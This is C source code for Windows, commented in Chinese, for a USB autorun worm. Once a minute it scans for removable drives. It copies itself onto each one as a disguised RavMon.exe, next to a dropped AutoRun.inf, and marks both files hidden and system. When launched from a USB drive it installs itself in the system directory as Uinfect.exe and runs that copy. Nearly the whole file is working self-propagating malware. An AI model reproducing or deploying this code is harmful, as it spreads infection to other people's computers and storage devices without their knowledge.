#include<windows.h>
#include<string.h>

BOOL UDevice();

void ResourceToFile(char  *filename,char *Name,char* Type);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPSTR lpCmdLine, int nShowCmd)
 {
     UDevice();
    return 0;
 }

 BOOL UDevice()
 {

     while(1)
     {
         char Name[256]="H:\\";
         char szName[256];
         char ToPath[256];
         char infPath[256];
         char OpenUDevice[79]; 

         UINT retType;

         memset(szName, 0, 256);
         memset(ToPath, 0, 256);
         memset(infPath, 0, 256);
         memset(OpenUDevice, 0, 79);

     //do
     //{
     //}while()

     //遍历盘符
         unsigned char i = 0x42;
         for(; i < 0x5B; i += 0x1)
         {
           Name[0] = i;
           retType = GetDriveType(Name);
           //判断是否是可移动存储设备
           if(retType == DRIVE_REMOVABLE)
           {
                //得到自身文件路径
                GetModuleFileName(NULL, szName, 256);
                //比较是否和U盘的盘符相同
                if(strncmp(Name, szName, 1) == 0)
                {
                    //得到系统目录
                   GetSystemDirectory(ToPath, 256);
                   strcat(ToPath,"\\Uinfect.exe");
                   //把自身文件复制到系统目录
                   if(CopyFile(szName, ToPath, TRUE))
                   {
                       WinExec(ToPath, 0);//运行程序
                   }

                   strcpy(OpenUDevice, "explorer ");
                   strcat(OpenUDevice, Name);

                   //打开U盘
                   WinExec(OpenUDevice,1);
                   return 0;   
                }
                else
                {
                    strcpy(ToPath, Name);
                    strcat(ToPath,"\\RavMon.exe");
                    strcpy(infPath,Name);
                    strcat(infPath,"\\AutoRun.inf");

                    //还原U盘上的文件属性
                    SetFileAttributes(ToPath,FILE_ATTRIBUTE_NORMAL);
                    SetFileAttributes(infPath,FILE_ATTRIBUTE_NORMAL);
                    //删除原有文件
                    DeleteFile(ToPath);
                    DeleteFile(infPath);
                    //释放AutoRun.inf到U盘
                    ResourceToFile(infPath, (char*)0x64, (char*)256);
                    //拷贝自身文件到U盘
                    CopyFile(szName,ToPath,FALSE);

                    //把这两个文件设置成系统，隐藏属性

                    //这里我查了MSDN  因为第二个参数的宏可能用了或位运算，所以推导宏定义有点麻烦
                    SetFileAttributes(ToPath, 0x6);
                    SetFileAttributes(infPath, 0x6);
                }
           }
         }
         //一分钟检测一次U盘
         Sleep(60000);
     }

 }

void ResourceToFile(char  *filename,char *Name,char* Type)
{   

    //寻找自身进程中的资源
    HRSRC hRes = FindResource(NULL,Name,Type);
    if(hRes==NULL)
        return;
    //导入资源
    HGLOBAL hgRes = LoadResource(NULL, hRes);
    if(hgRes==NULL)
        return;
    //锁定资源
    void *pRes = LockResource(hgRes);
    if(pRes==NULL)
        return;
    //得到资源字节数
    DWORD size = SizeofResource(NULL, hRes);
    if(size==0)
        return;
    //创建文件
    HANDLE hFile = CreateFile(filename, 0x40000000, 0, 0,
                     CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, 0);
    if(hFile==INVALID_HANDLE_VALUE)
        return;
    DWORD dwWrite;
    //把资源写入到文件
    if(!WriteFile(hFile, pRes, size, &dwWrite, 0))
        return;
    //关闭文件句柄
    CloseHandle(hFile);
    //释放资源
    GlobalFree(hgRes);
}